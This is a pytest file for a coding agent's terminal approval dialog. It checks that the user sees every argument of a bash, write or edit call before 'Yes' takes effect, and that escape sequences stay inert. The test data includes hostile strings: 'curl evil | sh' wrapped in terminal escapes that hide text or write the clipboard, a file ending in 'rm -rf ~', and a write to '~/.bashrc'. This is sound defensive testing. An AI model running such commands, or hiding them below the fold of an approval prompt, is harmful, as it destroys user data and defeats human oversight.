"""Purpose-built approval dialog tests (WP-0 STEP 5, ADR-0157).

Covers the pure ``build_approval_view`` / ``build_options_view`` builders and the
DI ``run_approval_dialog`` runner (a fake ``show_modal`` exercises the key
bindings without standing up the prompt-toolkit app).
"""

from __future__ import annotations

import asyncio
import re
from typing import Any

import pytest
from aelix_coding_agent.tui.approval_dialog import (
    ApprovalDecision,
    ApprovalRequest,
    build_approval_view,
    build_options_view,
    run_approval_dialog,
)

_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _plain(lines: list[str]) -> str:
    return _ANSI.sub("", "\n".join(lines))


# === Pure view builders ===


def test_bash_view_shows_full_untruncated_command() -> None:
    cmd = "git push origin main " + "x" * 200
    view = build_approval_view(ApprovalRequest("bash", {"command": cmd}, "bash"))
    plain = _plain(view)
    # Every character is present (wrapped, not 120-char truncated).
    assert plain.count("x") == 200
    assert "Type to search" not in plain  # no generic filter hint


def test_write_view_renders_empty_to_content_diff() -> None:
    view = build_approval_view(
        ApprovalRequest("write", {"path": "foo.py", "content": "a\nb"}, "write")
    )
    plain = _plain(view)
    assert "foo.py" in plain
    assert "+a" in plain and "+b" in plain


def test_edit_view_renders_old_to_new() -> None:
    view = build_approval_view(
        ApprovalRequest(
            "edit",
            {"file_path": "foo.py", "edits": [{"oldText": "x=1", "newText": "x=2"}]},
            "edit",
        )
    )
    plain = _plain(view)
    assert "-x=1" in plain and "+x=2" in plain


def test_edit_view_malformed_edit_does_not_crash() -> None:
    # A malformed edit entry must fall back, never raise.
    view = build_approval_view(
        ApprovalRequest("edit", {"file_path": "foo.py", "edits": [12345]}, "edit")
    )
    assert isinstance(view, list)


def test_view_width_bounded_no_border_clip() -> None:
    view = build_approval_view(
        ApprovalRequest("bash", {"command": "echo hi"}, "bash"), width=80
    )
    # No rendered line exceeds the bounded width (border fits).
    for line in view:
        assert len(_ANSI.sub("", line)) <= 80


def test_options_view_marks_selected_and_has_mnemonics() -> None:
    rows = build_options_view(2)
    assert rows[2].startswith("→")
    assert not rows[0].startswith("→")
    plain = "\n".join(rows)
    # 3 static rows (NO_REASON is fallback-only, not a dialog row — nit WP-0).
    for mnemonic in ("[y]", "[s]", "[n]"):
        assert mnemonic in plain
    assert "[r]" not in plain


# === DI runner: key bindings → decisions ===


class _FakeChrome:
    def invalidate(self) -> None:
        return None


def _build_runner_modal(captured: dict[str, Any]):
    """A fake ``show_modal`` that builds the content + captures its key bindings."""

    async def _show_modal(chrome: Any, build_content: Any, **_kw: Any) -> Any:
        loop = asyncio.get_running_loop()
        result: asyncio.Future[Any] = loop.create_future()
        content = build_content(result)
        captured["window"] = content
        captured["kb"] = _find_key_bindings(content)
        captured["result"] = result
        # The caller (the test) drives a key, then awaits the result.
        return await result

    return _show_modal


def _find_key_bindings(content: Any) -> Any:
    """Locate the option-window key bindings on the dialog content.

    Sprint 6h₂₈ (ADR-0159, review HIGH): the runner now returns an ``HSplit`` of
    [scrollable body, spacer, fixed options window] so the Yes/No rows are pinned
    outside the height cap. The key bindings live on the options window's control,
    so walk for the first control that exposes them (the body control has none).
    """

    kb = getattr(getattr(content, "content", None), "key_bindings", None)
    if kb is not None:
        return kb
    for child in getattr(content, "children", []) or []:
        found = _find_key_bindings(child)
        if found is not None:
            return found
    return None


def _press(captured: dict[str, Any], key: str) -> None:
    """Invoke the handler bound to ``key`` on the captured key bindings."""

    # prompt-toolkit normalizes ``enter`` → ``c-m``.
    target = "c-m" if key == "enter" else key
    kb = captured["kb"]
    for binding in kb.bindings:
        keys = tuple(getattr(k, "value", str(k)) for k in binding.keys)
        if keys == (target,):
            binding.handler(None)
            return
    raise AssertionError(f"no binding for {key}")


def _paint(captured: dict[str, Any], width: int, height: int) -> str:
    """Paint the REAL dialog container at ``width`` x ``height`` (prompt-toolkit's
    own ``write_to_screen``) and return the screen as text."""

    from prompt_toolkit.layout.containers import to_container
    from prompt_toolkit.layout.mouse_handlers import MouseHandlers
    from prompt_toolkit.layout.screen import Screen, WritePosition

    screen = Screen()
    to_container(captured["window"]).write_to_screen(
        screen, MouseHandlers(), WritePosition(0, 0, width, height), "", False, None
    )
    return "\n".join(
        "".join(screen.data_buffer[y][x].char for x in range(width)).rstrip() for y in range(height)
    )


async def _drive(request: ApprovalRequest, key: str) -> ApprovalDecision:
    """Open the dialog, paint it once on a screen it fits, press ``key``.

    The paint is part of the scenario since #389: every prompt holds Yes until
    its body has been on screen, so a key pressed before any paint is held.
    """

    captured: dict[str, Any] = {}

    async def _runner() -> ApprovalDecision:
        return await run_approval_dialog(
            request=request,
            show_modal=_build_runner_modal(captured),
            chrome=_FakeChrome(),
        )

    task = asyncio.ensure_future(_runner())
    # Wait until show_modal captured the bindings.
    for _ in range(50):
        if "kb" in captured:
            break
        await asyncio.sleep(0)
    _paint(captured, 80, 60)
    _press(captured, key)
    return await asyncio.wait_for(task, timeout=2)


_REQ = ApprovalRequest("bash", {"command": "echo hi"}, "bash")


@pytest.mark.parametrize(
    ("key", "expected"),
    [
        ("1", ApprovalDecision.YES),
        ("2", ApprovalDecision.YES_SESSION),
        ("3", ApprovalDecision.NO),
        ("y", ApprovalDecision.YES),
        ("s", ApprovalDecision.YES_SESSION),
        ("n", ApprovalDecision.NO),
        ("escape", ApprovalDecision.CANCEL),
        ("c-c", ApprovalDecision.CANCEL),
    ],
)
async def test_runner_keys_map_to_decisions(key: str, expected: ApprovalDecision) -> None:
    assert await _drive(_REQ, key) is expected


async def test_runner_enter_confirms_highlighted_row() -> None:
    # idx defaults to 0 → "Yes". Enter confirms the highlighted row.
    assert await _drive(_REQ, "enter") is ApprovalDecision.YES


async def test_runner_unknown_modal_result_is_cancel() -> None:
    # If show_modal resolves to a non-ApprovalDecision, the runner fails safe.
    async def _bad_modal(_chrome: Any, _build: Any, **_kw: Any) -> Any:
        return "garbage"

    decision = await run_approval_dialog(
        request=_REQ, show_modal=_bad_modal, chrome=_FakeChrome()
    )
    assert decision is ApprovalDecision.CANCEL


async def test_runner_space_does_not_auto_approve() -> None:
    # SECURITY (nit WP-0): ``space`` must NOT be a confirm key — the default
    # highlighted row is "Yes" (allow), so a stray space on a security prompt
    # would silently approve a mutating tool. Assert no ``space`` binding exists.
    captured: dict[str, Any] = {}

    async def _runner() -> ApprovalDecision:
        return await run_approval_dialog(
            request=_REQ,
            show_modal=_build_runner_modal(captured),
            chrome=_FakeChrome(),
        )

    task = asyncio.ensure_future(_runner())
    for _ in range(50):
        if "kb" in captured:
            break
        await asyncio.sleep(0)
    kb = captured["kb"]
    bound_keys = {
        tuple(getattr(k, "value", str(k)) for k in b.keys) for b in kb.bindings
    }
    assert ("space",) not in bound_keys
    # Resolve the dialog so the task doesn't leak.
    _press(captured, "n")
    assert await asyncio.wait_for(task, timeout=2) is ApprovalDecision.NO


# === HIGH (ADR-0159): options pinned outside the height cap, never clipped ===


def _captured_content(request: ApprovalRequest) -> Any:
    """Synchronously build the dialog content via a fake show_modal."""

    box: dict[str, Any] = {}

    async def _show_modal(_chrome: Any, build_content: Any, **_kw: Any) -> Any:
        loop = asyncio.get_running_loop()
        result: asyncio.Future[Any] = loop.create_future()
        box["content"] = build_content(result)
        result.set_result(ApprovalDecision.CANCEL)
        return await result

    asyncio.run(
        run_approval_dialog(
            request=request, show_modal=_show_modal, chrome=_FakeChrome()
        )
    )
    return box["content"]


def test_runner_pins_options_in_fixed_height_window_outside_cap() -> None:
    # SECURITY/HIGH (ADR-0159): a body taller than the height cap must NOT clip
    # the Yes/No option rows. The dialog is an HSplit of [scrollable body, spacer,
    # FIXED-height options window]; an HSplit shrinks the flexible body first and
    # keeps the fixed options window at full height under the cap, so the deny
    # option stays visible no matter how tall the diff body is.
    from prompt_toolkit.layout import HSplit
    from prompt_toolkit.layout.containers import to_container

    # A write with a very long content → a tall synthetic diff body.
    big = "\n".join(f"new line {i}" for i in range(200))
    content = _captured_content(
        ApprovalRequest("write", {"path": "/tmp/x", "content": big}, "write")
    )
    container = to_container(content)
    assert isinstance(container, HSplit)
    children = container.get_children()
    # [body, spacer, options]
    assert len(children) == 3
    body_win, _spacer, options_win = children

    # The options window is FIXED at exactly its row count (3 options + 1 hint),
    # and that height is independent of the available height (so the cap can't
    # squeeze it away).
    n_rows = len(build_options_view(0))
    for avail in (4, 6, 40, 200):
        dim = options_win.preferred_height(80, avail)
        assert dim.min == n_rows
        assert dim.max == n_rows
        assert dim.preferred == n_rows

    # The body, by contrast, is flexible (no exact pin) so it absorbs the squeeze.
    body_dim = body_win.preferred_height(80, 6)
    assert body_dim.min <= n_rows  # body can shrink below the option height


# === #188 review round 2: Yes waits until every argument has been on screen ===
#
# The body of a tool aelix did not build lists every argument, but it sits in a
# height-capped modal. On 1efb91d1, at 80x24, six 198-character values filled
# it, ``path`` and ``content`` were below the fold with nothing saying so, and
# Yes wrote the file. These rows paint the REAL dialog container at a fixed
# size (prompt-toolkit's own ``write_to_screen``), so what counts as "shown" is
# what reached the screen.

_LONG_VALUES = {
    **{f"note{i}": "r" * 198 for i in range(1, 7)},
    "path": "decisive-188.txt",
    "content": "pwned",
}
_MANY_SHORT = {
    **{f"note{i:02d}": "routine" for i in range(1, 41)},
    "path": "decisive-188.txt",
    "content": "pwned",
}
_SIXTY = {**{f"note{i:02d}": "routine" for i in range(1, 61)}, "path": "decisive-188.txt"}


class _Open:
    """A dialog held open, painted and keyed by hand (``kind="other"`` unless
    a ``request`` is given)."""

    def __init__(
        self, args: dict[str, Any], width: Any = 80, request: ApprovalRequest | None = None
    ) -> None:
        self.request = request or ApprovalRequest("fs__write_file", dict(args), "other")
        self.width = width
        self.captured: dict[str, Any] = {}
        self.screens: list[str] = []

    async def __aenter__(self) -> _Open:
        self.task = asyncio.ensure_future(
            run_approval_dialog(
                request=self.request,
                show_modal=_build_runner_modal(self.captured),
                chrome=_FakeChrome(),
                width=self.width,
            )
        )
        for _ in range(50):
            if "kb" in self.captured:
                break
            await asyncio.sleep(0)
        return self

    async def __aexit__(self, *_exc: object) -> None:
        if not self.task.done():
            self.captured["result"].cancel()
        await asyncio.gather(self.task, return_exceptions=True)

    def paint(self, width: int, height: int) -> str:
        text = _paint(self.captured, width, height)
        self.screens.append(text)
        return text

    def press(self, key: str) -> None:
        _press(self.captured, key)

    @property
    def answered(self) -> bool:
        return bool(self.captured["result"].done())

    async def answer(self) -> ApprovalDecision:
        return await asyncio.wait_for(self.task, timeout=2)


def _footer(screen: str) -> str:
    """The row above the option rows (``→ 1.`` starts the options)."""

    lines = screen.splitlines()
    first_option = next(i for i, line in enumerate(lines) if line.startswith(("→ 1.", "  1.")))
    return lines[first_option - 1]


# (args, terminal width, height the modal gets). 80x24 leaves the modal 18
# rows in the pty runs; 120x40 leaves it 34.
_OVERFLOWING = [
    pytest.param(_LONG_VALUES, 80, 18, id="six-198-char-values-80x24"),
    pytest.param(_MANY_SHORT, 120, 34, id="forty-short-fillers-120x40"),
    pytest.param(_SIXTY, 80, 18, id="sixty-fillers-80x24"),
]


@pytest.mark.parametrize(("args", "width", "height"), _OVERFLOWING)
async def test_yes_is_held_until_the_decisive_argument_has_been_on_screen(
    args: dict[str, Any], width: int, height: int
) -> None:
    async with _Open(args, width=width) as dialog:
        first = dialog.paint(width, height)
        assert "path=" not in first, "the scenario must start with path below the fold"
        footer = _footer(first)
        assert re.match(r"\d+ of \d+ lines hidden \(↑0 ↓\d+\) · PgUp/PgDn to scroll", footer)
        assert "Yes held until all seen" in footer

        for key in ("1", "y", "Y", "2", "s", "S", "enter", "c-j"):
            dialog.press(key)
            assert not dialog.answered, f"{key!r} approved a call whose path was never shown"
            dialog.paint(width, height)

        for _ in range(40):
            if "Yes held" not in _footer(dialog.screens[-1]):
                break
            dialog.press("pagedown")
            dialog.paint(width, height)
        assert "Yes held" not in _footer(dialog.screens[-1])
        assert any("path='decisive-188.txt'" in s for s in dialog.screens)

        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


@pytest.mark.parametrize("key", ["3", "n", "N", "escape", "c-c"])
async def test_no_and_esc_answer_while_arguments_are_hidden(key: str) -> None:
    async with _Open(_LONG_VALUES) as dialog:
        dialog.paint(80, 18)
        dialog.press(key)
        expected = ApprovalDecision.NO if key in ("3", "n", "N") else ApprovalDecision.CANCEL
        assert await dialog.answer() is expected


async def test_yes_for_this_session_is_held_the_same_way() -> None:
    async with _Open(_LONG_VALUES) as dialog:
        dialog.paint(80, 18)
        dialog.press("down")  # highlight "Yes, for this session"
        dialog.press("enter")
        dialog.press("2")
        assert not dialog.answered
        for _ in range(10):
            dialog.press("pagedown")
            dialog.paint(80, 18)
        dialog.press("2")
        assert await dialog.answer() is ApprovalDecision.YES_SESSION


async def test_scrolling_without_a_repaint_shows_nothing() -> None:
    """Keys typed ahead of the screen cannot approve: only a paint counts, and
    jumping to the end does not count the lines it jumped over."""

    async with _Open(_SIXTY) as dialog:
        dialog.paint(80, 18)
        for _ in range(30):
            dialog.press("pagedown")
        dialog.press("1")
        assert not dialog.answered
        bottom = dialog.paint(80, 18)
        assert "path='decisive-188.txt'" in bottom
        dialog.press("1")
        assert not dialog.answered, "the middle rows were never painted"
        assert "Yes held until all seen" in _footer(bottom)


async def test_yes_typed_before_the_first_paint_is_held() -> None:
    """Even for a body that fits: nothing is on screen before the first paint.
    The held key is dropped, not queued (ADR-0253 §9, review round 3)."""

    async with _Open({"path": "a.txt", "content": "x"}) as dialog:
        dialog.press("1")
        assert not dialog.answered
        screen = dialog.paint(80, 18)
        assert _footer(screen) == ""
        assert not dialog.answered, "the held Yes was queued and answered at the paint"
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


async def test_a_body_that_fits_has_a_blank_footer_and_yes_works_at_once() -> None:
    async with _Open(_MANY_SHORT, width=120) as dialog:
        screen = dialog.paint(120, 60)
        assert "path='decisive-188.txt'" in screen
        assert _footer(screen) == ""
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


async def test_a_width_change_forgets_what_was_shown() -> None:
    """The body re-wraps at a new width, so the lines it was shown are not the
    lines it has now. Narrow first (more lines, all painted), then wide."""

    width = {"v": 60}
    async with _Open(_LONG_VALUES, width=lambda: width["v"]) as dialog:
        assert _footer(dialog.paint(60, 80)) == ""  # everything shown at 60
        width["v"] = 120
        dialog.press("1")
        assert not dialog.answered, "nothing has been painted at the new width"
        screen = dialog.paint(120, 10)
        assert re.match(r"\d+ of \d+ lines hidden \(↑0 ↓\d+\) · PgUp/PgDn", _footer(screen))
        dialog.press("1")
        assert not dialog.answered, "lines shown at the old width counted at the new one"


async def test_no_room_for_the_body_holds_yes_and_says_so(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import aelix_coding_agent.tui.approval_dialog as approval_mod

    paints = {"n": 0}
    monkeypatch.setattr(approval_mod, "_render_stamp", lambda: paints["n"])
    async with _Open(_LONG_VALUES) as dialog:
        paints["n"] += 1
        assert "lines hidden" in _footer(dialog.paint(80, 18))
        paints["n"] += 1
        screen = dialog.paint(80, 5)  # four option rows + the footer, no body
        # Not the previous paint's numbers: this paint drew no body at all.
        assert "do not fit on screen" in _footer(screen)
        dialog.press("1")
        assert not dialog.answered
        dialog.press("3")
        assert await dialog.answer() is ApprovalDecision.NO


def test_the_footer_is_one_fixed_row_between_the_body_and_the_options() -> None:
    from prompt_toolkit.layout.containers import to_container

    content = to_container(_captured_content(ApprovalRequest("t", dict(_LONG_VALUES), "other")))
    body, footer, options = content.get_children()
    n_rows = len(build_options_view(0))
    for avail in (4, 18, 200):
        assert footer.preferred_height(80, avail).preferred == 1
        assert footer.preferred_height(80, avail).max == 1
        assert options.preferred_height(80, avail).preferred == n_rows
    assert body.preferred_height(80, 200).preferred == len(
        build_approval_view(ApprovalRequest("t", dict(_LONG_VALUES), "other"))
    )


# === #389: every kind holds Yes until its whole body has been on screen ===
#
# aelix's own bash prompt showed the command in the same height-capped body
# with no footer and took Yes at once. Measured on 402a8013 at 80x24 (real
# CLI): ``true arg000 … arg399 ; echo TAIL_MARKER_389 >> out.txt`` showed up to
# about arg130, and 1 ran it. The write and edit prompts stopped their diff at
# 40 lines and cut every row at the Panel width, so the end of a file was
# approved without being drawn at all. Every row here ends in the decisive part.

_TAIL = "TAIL_MARKER_389"


def _bash_long(n: int = 400) -> ApprovalRequest:
    command = "true " + " ".join(f"arg{i:03d}" for i in range(n)) + f" ; echo {_TAIL} > out.txt"
    return ApprovalRequest("bash", {"command": command}, "bash")


def _write_long() -> ApprovalRequest:
    content = "".join(f"filler line {i:03d}\n" for i in range(120)) + f"{_TAIL} rm -rf ~\n"
    return ApprovalRequest("write", {"path": "out.txt", "content": content}, "write")


def _edit_long() -> ApprovalRequest:
    new = "".join(f"filler line {i:03d}\n" for i in range(120)) + _TAIL
    edits = [{"oldText": "hello from readme", "newText": new}]
    return ApprovalRequest("edit", {"path": "README.txt", "edits": edits}, "edit")


def _write_wide() -> ApprovalRequest:
    content = "x = 1  # " + "pad " * 60 + _TAIL + "\n"
    return ApprovalRequest("write", {"path": "out.txt", "content": content}, "write")


# (request, terminal width, height the modal gets: 18 at 80x24, 34 at 120x40)
_HELD_KINDS = [
    pytest.param(_bash_long(), 80, 18, id="bash-issue-command-80x24"),
    pytest.param(_bash_long(1000), 120, 34, id="bash-1000-args-120x40"),
    pytest.param(_write_long(), 80, 18, id="write-121-lines-80x24"),
    pytest.param(_write_long(), 120, 34, id="write-121-lines-120x40"),
    pytest.param(_edit_long(), 80, 18, id="edit-121-lines-80x24"),
    pytest.param(_edit_long(), 120, 34, id="edit-121-lines-120x40"),
]


def _held(footer: str) -> bool:
    return "Yes held" in footer


@pytest.mark.parametrize(("req", "width", "height"), _HELD_KINDS)
async def test_every_kind_holds_yes_until_its_tail_has_been_on_screen(
    req: ApprovalRequest, width: int, height: int
) -> None:
    async with _Open({}, width=width, request=req) as dialog:
        first = dialog.paint(width, height)
        assert _TAIL not in first, "the scenario must start with the tail below the fold"
        footer = _footer(first)
        assert "hidden" in footer and "PgUp/PgDn" in footer and _held(footer), footer

        for key in ("1", "y", "Y", "2", "s", "S", "enter", "c-j"):
            dialog.press(key)
            assert not dialog.answered, f"{key!r} approved a body whose tail was never shown"
            dialog.paint(width, height)

        for _ in range(60):
            if not _held(_footer(dialog.screens[-1])):
                break
            dialog.press("pagedown")
            dialog.paint(width, height)
        assert not _held(_footer(dialog.screens[-1]))
        assert any(_TAIL in screen for screen in dialog.screens), "released before the tail"

        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


@pytest.mark.parametrize("key", ["3", "n", "N", "escape", "c-c"])
@pytest.mark.parametrize(
    "req", [_bash_long(), _write_long(), _edit_long()], ids=["bash", "write", "edit"]
)
async def test_no_and_esc_answer_while_the_tail_is_hidden(req: ApprovalRequest, key: str) -> None:
    async with _Open({}, request=req) as dialog:
        assert _held(_footer(dialog.paint(80, 18)))
        dialog.press(key)
        expected = ApprovalDecision.NO if key in ("3", "n", "N") else ApprovalDecision.CANCEL
        assert await dialog.answer() is expected


async def test_a_long_command_typed_ahead_of_the_screen_is_not_approved() -> None:
    """PgDn to the end without painting the middle, then Yes: still held."""

    async with _Open({}, request=_bash_long()) as dialog:
        dialog.paint(80, 18)
        for _ in range(40):
            dialog.press("pagedown")
        bottom = dialog.paint(80, 18)
        assert _TAIL in bottom
        dialog.press("1")
        assert not dialog.answered, "the middle of the command was never painted"


async def test_page_down_moves_one_screen_less_one_line() -> None:
    """#188 scrolled five lines a press; a 121-line write then took 23 presses
    at 80x24 (ceil(112 / 5), review round 2's correction of round 1's 25). A
    page keeps one line of context and skips none."""

    async with _Open({}, request=_write_long()) as dialog:
        first = dialog.paint(80, 18).splitlines()
        rows = first.index(_footer("\n".join(first)))
        dialog.press("pagedown")
        second = dialog.paint(80, 18).splitlines()
        assert second[0] == first[rows - 1]
        assert second[1] != first[rows - 1]


def _plain_view(req: ApprovalRequest, width: int = 80) -> str:
    return _plain(build_approval_view(req, width=width))


@pytest.mark.parametrize("req", [_write_long(), _edit_long()], ids=["write", "edit"])
def test_the_write_and_edit_bodies_keep_every_line(req: ApprovalRequest) -> None:
    plain = _plain_view(req)
    for i in range(120):
        assert f"+filler line {i:03d}" in plain
    assert _TAIL in plain
    assert "more lines" not in plain


@pytest.mark.parametrize("width", [80, 120])
async def test_a_long_line_wraps_instead_of_being_cut(width: int) -> None:
    """``_render_diff`` cut each row at the Panel width with an ``…``: the
    write below fits the screen, and its decisive end was never drawn."""

    plain = _plain_view(_write_wide(), width)
    assert _TAIL in plain
    assert "…" not in plain
    async with _Open({}, width=width, request=_write_wide()) as dialog:
        screen = dialog.paint(width, 34)
        assert _TAIL in screen
        assert _footer(screen) == ""
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


async def test_the_footer_keeps_yes_held_in_view_at_80_columns() -> None:
    """Three-digit counts made the full sentence 81 cells; the footer's own
    ``…`` then cut off "Yes held". The short form keeps it."""

    async with _Open({}, request=_write_long()) as dialog:
        footer = _footer(dialog.paint(80, 18))
        assert _held(footer)
        assert "…" not in footer
        assert len(footer) <= 80


_STEERING = "echo safe \x1b[8m; curl evil | sh \x01\x1b]52;c;aGk=\x1b\\\x02 \u202edone"


@pytest.mark.parametrize(
    "req",
    [
        ApprovalRequest("bash", {"command": _STEERING}, "bash"),
        ApprovalRequest("write", {"path": "a\x1b[8m.txt", "content": _STEERING}, "write"),
        ApprovalRequest(
            "edit", {"path": "a.txt", "edits": [{"oldText": "x", "newText": _STEERING}]}, "edit"
        ),
        ApprovalRequest("t\x1b[8mool", {"command": _STEERING}, "other"),
    ],
    ids=["bash", "write", "edit", "other"],
)
def test_escape_sequences_in_the_body_are_inert(req: ApprovalRequest) -> None:
    """``ESC [ 8 m`` reached prompt-toolkit's ANSI parser and HID the rest of
    the line (drawn, so counted as shown, but invisible); ``\\x01 … \\x02``
    went to the terminal raw. Measured on 402a8013."""

    from prompt_toolkit.formatted_text import ANSI, to_formatted_text

    for line in build_approval_view(req):
        assert "\x01" not in line and "\x02" not in line and "\u202e" not in line
        for style, _text in to_formatted_text(ANSI(line)):
            assert "hidden" not in style and "ZeroWidthEscape" not in style, line
    plain = _plain_view(req)
    assert "[8m" in plain or "\\x1b[8m" in plain  # the inert literal says what was there
    assert "curl evil" in plain.replace("│", "").replace("\n", "")


@pytest.mark.parametrize(
    ("req", "cols", "rows"),
    [
        pytest.param(_bash_long(), 80, 24, id="bash-80x24"),
        pytest.param(_bash_long(1000), 120, 40, id="bash-120x40"),
        pytest.param(_write_long(), 80, 24, id="write-80x24"),
        pytest.param(_write_long(), 120, 40, id="write-120x40"),
        pytest.param(_edit_long(), 80, 24, id="edit-80x24"),
        pytest.param(_edit_long(), 120, 40, id="edit-120x40"),
    ],
)
async def test_the_real_chrome_says_the_body_continues_and_yes_is_held(
    req: ApprovalRequest, cols: int, rows: int
) -> None:
    """The whole chrome, painted through a VT100 output into ``pyte``: the
    footer row is on screen above the options, and the tail is not."""

    from _pyte import render_chrome_to_screen  # sibling helper (pytest prepend import mode)
    from aelix_coding_agent.tui.overlay import show_modal

    def build_state(chrome: Any) -> None:
        asyncio.ensure_future(
            run_approval_dialog(request=req, show_modal=show_modal, chrome=chrome, width=cols)
        )

    display = await render_chrome_to_screen(rows=rows, cols=cols, build_state=build_state)
    joined = "\n".join(display)
    assert _TAIL not in joined
    footer = next(line for line in display if "Yes held" in line)
    assert "hidden" in footer and "PgUp/PgDn" in footer
    assert "[n] No" in joined


# === #389 review round 2 =====================================================
#
# Each row below was red on 1c8eb79a (round 1) and, where the defect is older,
# on 402a8013 too. The kit that measured them live is
# ``.omc/probes/389-live/r2/``.


def _edit_both_shapes(new_toplevel: str = "HIDDEN_TOPLEVEL_389") -> ApprovalRequest:
    """``edits`` AND a top-level ``oldText``/``newText``: the edit tool applies both."""

    args = {
        "path": "README.txt",
        "edits": [{"oldText": "hello", "newText": "HELLO"}],
        "oldText": "second line",
        "newText": new_toplevel,
    }
    return ApprovalRequest("edit", args, "edit")


def test_the_edit_body_is_the_list_the_edit_tool_applies() -> None:
    """Round 1 drew ``edits`` only; ``prepare_edit_arguments`` (what the tool
    runs) appends the top-level pair, so ``1`` applied an edit never shown."""

    from aelix_coding_agent.tools._edit_diff import prepare_edit_arguments

    req = _edit_both_shapes()
    plain = _plain_view(req)
    applied = prepare_edit_arguments(req.args)["edits"]
    assert len(applied) == 2
    for i, edit in enumerate(applied):
        assert f"@@ edit {i + 1} of 2 @@" in plain
        assert f"-{edit['oldText']}" in plain and f"+{edit['newText']}" in plain
    assert plain.index("+HELLO") < plain.index("+HIDDEN_TOPLEVEL_389"), "the tool's order"


def test_an_edits_list_sent_as_json_text_is_shown_as_the_tool_parses_it() -> None:
    """The tool parses ``edits`` given as a JSON string (pi's prepareArguments).
    Schema validation rejects that shape before the gate today, so this row
    pins the body to the tool's function rather than to that ordering."""

    import json

    edits = json.dumps([{"oldText": "a", "newText": "HIDDEN_JSON_389"}])
    plain = _plain_view(ApprovalRequest("edit", {"path": "R", "edits": edits}, "edit"))
    assert "+HIDDEN_JSON_389" in plain


def test_arguments_the_edit_tool_cannot_read_are_shown_raw() -> None:
    plain = _plain_view(ApprovalRequest("edit", {"path": "R", "old_string": "zz"}, "edit"))
    assert "will refuse" in plain and "old_string='zz'" in plain


async def test_a_long_top_level_edit_holds_yes_like_any_other() -> None:
    """The appended edit counts toward the body the hold waits for."""

    new = "".join(f"filler {i:03d}\n" for i in range(60)) + _TAIL
    async with _Open({}, request=_edit_both_shapes(new)) as dialog:
        first = dialog.paint(80, 18)
        assert _held(_footer(first)) and _TAIL not in first
        dialog.press("1")
        assert not dialog.answered
        for _ in range(20):
            if not _held(_footer(dialog.screens[-1])):
                break
            dialog.press("pagedown")
            dialog.paint(80, 18)
        assert any(_TAIL in s for s in dialog.screens)
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


@pytest.mark.parametrize(
    ("raw", "lands"),
    [("@~/.bashrc", ".bashrc"), ("~/notes.txt", "notes.txt"), ("@out.txt", "out.txt")],
)
def test_a_path_the_tool_rewrites_says_where_the_write_lands(raw: str, lands: str) -> None:
    """``expand_path`` drops one ``@`` and expands ``~``: ``@~/.bashrc`` is a
    write to the home directory's ``.bashrc``."""

    from aelix_coding_agent.tools._path_utils import expand_path

    expanded = expand_path(raw)
    assert expanded.endswith(lands) and expanded != raw
    for kind, args in (("write", {"content": "x"}), ("edit", {"edits": [{"oldText": "a", "newText": "b"}]})):
        plain = _plain_view(ApprovalRequest(kind, {"path": raw, **args}, kind))
        flat = re.sub(r"[│\s]", "", plain)
        assert re.sub(r"\s", "", f"The tool writes to: {expanded}") in flat
    plain = _plain_view(ApprovalRequest("write", {"path": "plain.txt", "content": "x"}, "write"))
    assert "The tool writes to" not in plain


# --- kind="other": nothing is cut ------------------------------------------


def test_a_long_argument_value_is_shown_whole() -> None:
    from aelix_coding_agent.tui.approval_dialog import argument_rows

    value = "safe-looking " * 32 + "DECISIVE_TAIL"
    assert argument_rows({"content": value}) == [f"content={value!r}"]
    assert argument_rows({"k" * 100: 1}) == ["k" * 100 + "=1"]
    flat = re.sub(r"[│\s]", "", _plain_view(ApprovalRequest("t", {"content": value}, "other")))
    assert re.sub(r"\s", "", repr(value)) in flat
    assert "morechars" not in flat


async def test_a_long_value_holds_yes_until_its_end_has_been_on_screen() -> None:
    """A 417-character value used to be cut to 200 with a marker; the body then
    fit the screen and Yes was taken at once."""

    async with _Open({"content": "x" * 3000 + " DECISIVE_TAIL", "path": "p"}) as dialog:
        first = dialog.paint(80, 18)
        assert _held(_footer(first)) and "DECISIVE_TAIL" not in first
        dialog.press("1")
        assert not dialog.answered
        for _ in range(40):
            if not _held(_footer(dialog.screens[-1])):
                break
            dialog.press("pagedown")
            dialog.paint(80, 18)
        assert any("DECISIVE_TAIL" in s for s in dialog.screens)
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


# --- the redirect row (#161) approves a write ------------------------------


def _redirect_write() -> ApprovalRequest:
    return ApprovalRequest(
        "write",
        dict(_write_long().args),
        "write",
        yes_label="Yes — user global, every project (/g/ext.py)",
        redirect_label="Only this project (/p/.aelix/extensions/ext.py)",
    )


@pytest.mark.parametrize("key", ["3", "p", "P", "enter"])
async def test_the_redirect_row_is_held_until_the_whole_write_has_been_on_screen(key: str) -> None:
    async with _Open({}, request=_redirect_write()) as dialog:
        assert _held(_footer(dialog.paint(80, 18)))
        if key == "enter":
            dialog.press("down")
            dialog.press("down")  # highlight the redirect row
        dialog.press(key)
        assert not dialog.answered, f"{key!r} redirected a write whose tail was never shown"
        for _ in range(30):
            if not _held(_footer(dialog.screens[-1])):
                break
            dialog.press("pagedown")
            dialog.paint(80, 18)
        assert any(_TAIL in s for s in dialog.screens)
        dialog.press(key)
        assert await dialog.answer() is ApprovalDecision.REDIRECT


async def test_no_answers_on_the_redirect_dialog_while_held() -> None:
    async with _Open({}, request=_redirect_write()) as dialog:
        assert _held(_footer(dialog.paint(80, 18)))
        dialog.press("4")
        assert await dialog.answer() is ApprovalDecision.NO


def test_a_control_character_in_an_option_label_is_named_not_obeyed() -> None:
    req = ApprovalRequest("write", {}, "write", yes_label="Yes", redirect_label="Only (x\x1b[8my)")
    from aelix_coding_agent.tui.approval_dialog import rows_for

    row = build_options_view(0, rows_for(req))[2]
    assert "\x1b[8m" not in row and "^[" in row


@pytest.mark.parametrize(("char", "name"), [("\x1b", "^["), ("\u202e", "<U+202E>"), ("\r", "^M")])
def test_a_name_in_an_option_label_is_drawn_in_reverse_video(char: str, name: str) -> None:
    """Review round 3 (a surviving mutant: the option rows dropped SGR 7 and
    every row stayed green). The label's name must read differently from the
    same letters typed, as it does in the body."""

    from aelix_coding_agent.tui.approval_dialog import rows_for
